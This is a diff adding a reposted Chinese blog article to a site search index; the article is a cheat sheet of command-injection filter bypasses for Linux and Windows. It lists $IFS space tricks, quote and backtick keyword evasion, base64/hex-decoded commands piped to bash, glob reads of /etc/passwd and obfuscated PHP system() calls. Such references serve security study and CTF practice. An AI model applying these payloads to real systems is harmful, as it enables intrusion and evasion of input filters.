@@ -4885,4 +4885,96 @@ eval($a['t'].$ab);
         <tag>phar</tag>
       </tags>
   </entry>
+  <entry>
+    <title>命令执行绕过总结</title>
+    <url>/2020/08/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>转载：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd</a></strong></p>
+<h1 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h1><h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;who</span><br><span class="line">b&#x3D;ami</span><br><span class="line">$a$b &#x2F;&#x2F;输出whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="常用字符使用"><a href="#常用字符使用" class="headerlink" title="常用字符使用"></a>常用字符使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真(命令返回值 $? &#x3D;&#x3D; 0),&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假(命令返回值 $? &#x3D;&#x3D; 1),||右边的命令才会被执行。</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">| (管道符)     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>
+
+<p>例:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo qwe ; ls 				&#x2F;&#x2F;会先输出字符qwe,然后执行ls</span><br><span class="line">q&#x3D;l; w&#x3D;s; e&#x3D;&quot; -al&quot;; $q$w$e 	&#x2F;&#x2F;执行ls -al命令</span><br><span class="line">qwe | ls 					&#x2F;&#x2F;执行后面的命令,前面的不执行</span><br></pre></td></tr></table></figure>
+
+<p>这些都可以自己去试试…这些字符最多用到的就是<code>;</code>和<code>|</code>就先只说最常用的了…</p>
+<h3 id="利用Linux的环境变量"><a href="#利用Linux的环境变量" class="headerlink" title="利用Linux的环境变量"></a>利用Linux的环境变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;	&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line"></span><br><span class="line">echo $&#123;PATH:1:9&#125;&#x2F;&#x2F;usr&#x2F;local</span><br></pre></td></tr></table></figure>
+
+<p>可以通过截断和拼接来得到我们想要的来getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125;	&#x2F;&#x2F;l</span><br><span class="line">$&#123;PATH:2:1&#125;	&#x2F;&#x2F;s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;	&#x2F;&#x2F;拼接后是ls,执行命令</span><br><span class="line">$&#123;PATH:5:1&#125;s			&#x2F;&#x2F;拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><p>基础常见版本:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wh\o\ami	&#x2F;&#x2F;反斜线绕过</span><br><span class="line">who&quot;a&quot;mi	&#x2F;&#x2F;双引号绕过</span><br><span class="line">whoa&#39;m&#39;i	&#x2F;&#x2F;单引号绕过</span><br><span class="line">whoam&#96;&#96;i	&#x2F;&#x2F;反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh	&#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash&#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">&#96;echo d2hvYW1p|base64 -d&#96; &#x2F;&#x2F;将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash &#x2F;&#x2F;hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;&#x3D;10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure>
+
+<p>进阶深入:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666&#96;whoami&#96;666		&#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">666&#96;\whoami&#96;666		&#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">&#x2F;&#x2F;命令执行后的结果在2个666中间</span><br></pre></td></tr></table></figure>
+
+<p>所以更进一步:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#96;f1hgb&#96;ho&#96;f1hgb&#96;am&#96;f1hgb&#96;i		&#x2F;&#x2F;反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w&#96;\f1hgb&#96;ho&#96;\f1hgb&#96;am&#96;\f1hgb&#96;i	&#x2F;&#x2F;这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi			&#x2F;&#x2F;和上面的差不多,都说执行和拼接</span><br></pre></td></tr></table></figure>
+
+<p>既可以绕过命令,又可以绕过文件名的,下述的则是只能用来绕过文件名的:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat fl[abc]g.php								 &#x2F;&#x2F;匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag.txt								 &#x2F;&#x2F;匹配a-z范围的任何字符</span><br><span class="line">cat fla*										 &#x2F;&#x2F;用*匹配任意</span><br><span class="line">a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.php 表示cat flag.php		&#x2F;&#x2F;内联执行</span><br></pre></td></tr></table></figure>
+
+<p>下述的则是文件名绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用正则:比如要读取etc&#x2F;passwd</span><br><span class="line">cat &#x2F;???&#x2F;??????</span><br><span class="line">cat &#x2F;???&#x2F;pass*</span><br><span class="line">cat &#x2F;etc$u&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令执行函数绕过"><a href="#命令执行函数绕过" class="headerlink" title="命令执行函数绕过"></a>命令执行函数绕过</h3><p>这里只举例<code>system</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;(sy.&#x2F;*fthgb666*&#x2F;(st)&#x2F;*fthgb666*&#x2F;.em)&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h1><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><ul>
+<li><p><code>whoami</code> //正常执行</p>
+</li>
+<li><p><code>w&quot;h&quot;o&quot;a&quot;m&quot;i</code> 或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</code>或<code>w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>//正常执行</p>
+</li>
+<li><p><code>who^ami</code>或<code>wh&quot;&quot;o^a^mi</code> 或<code>wh&quot;&quot;o^a^mi&quot;</code>//正常执行</p>
+</li>
+<li><ul>
+<li>但是<code>&quot;wh&quot;&quot;o^a^mi&quot;</code>这种在开头就有单引号的情况是不能执行的</li>
+</ul>
+</li>
+<li><p><code>(Whoami)</code>或<code>(Wh^o^am&quot;&quot;i)</code>或<code>((((Wh^o^am&quot;&quot;i))))</code> //正常执行</p>
+</li>
+</ul>
+<p>  注:可以加无数个<code>&quot;</code>但不能同时连续加2个<code>^</code>符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</p>
+<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p>知识点:用两个%括起来的变量,会输出变量的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;1 &#x2F;&#x2F;设置变量a，值为1</span><br><span class="line">echo a &#x2F;&#x2F;此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a% &#x2F;&#x2F;此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>接下来的进阶利用就是:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;who</span><br><span class="line">set b&#x3D;ami</span><br><span class="line">%a%%b% &#x2F;&#x2F;正常执行whoami</span><br><span class="line">call %a%%b% &#x2F;&#x2F;正常执行whoami</span><br></pre></td></tr></table></figure>
+
+<p>所以,上述的符号与命令部分的所有操作,都可以通过<code>set</code>来实现,只需要慢慢拼接就ok</p>
+<h3 id="切割字符"><a href="#切割字符" class="headerlink" title="切割字符"></a>切割字符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;whoami</span><br><span class="line">%a:~0% &#x2F;&#x2F;取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6% &#x2F;&#x2F;从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5% &#x2F;&#x2F;切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注:上述可以使用减号,和python的切割效果差不多</p>
+<p>所以,可以考虑的东西就来了:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;abc qwe &#x2F;&#x2F;先自定义</span><br><span class="line">wh^o^%a:~0,1%mi &#x2F;&#x2F;然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>
+
+<p>所以,这样写webshell什么的也就很简单了</p>
+<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul>
+<li><code>|</code>:可以连接命令,但只会执行后面的那条</li>
+<li><code>||</code>:只有前面的命令失败,才会执行后面的语句</li>
+<li><code>&amp;</code>:前面的命令可以成功也可以失败,都会执行后面的命令</li>
+<li><code>&amp;&amp;</code>:必须两条命令都为真才可以全部执行。如果第一条语句错误,整个命令都不执行。如果第一条语句对,第二条错误,就只执行第一条</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami | ping www.baidu.com</span><br><span class="line">whoami || ping www.baidu.com</span><br><span class="line">qwe &amp; ping www.baidu.com</span><br><span class="line">qwe &amp;&amp; ping www.baidu.com</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
 </search>
